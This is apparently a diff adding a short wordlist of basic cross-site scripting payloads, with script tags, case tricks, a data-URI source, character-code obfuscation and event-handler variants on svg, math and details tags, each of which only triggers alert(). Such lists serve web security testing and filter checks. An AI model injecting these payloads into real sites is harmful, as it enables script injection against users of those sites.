@@ -1,0 +1,10 @@
+# Basic XSS Payloads
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script src="data:text/javascript,alert(1)"></script>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<ScRipT>alert("XSS")</ScRipT>
+<plaintext><script>alert(1)</script>
+<svg/onload=alert(1)>
+<math><a xlink:href="javascript:alert(1)">click
+<details open ontoggle=alert(1)>
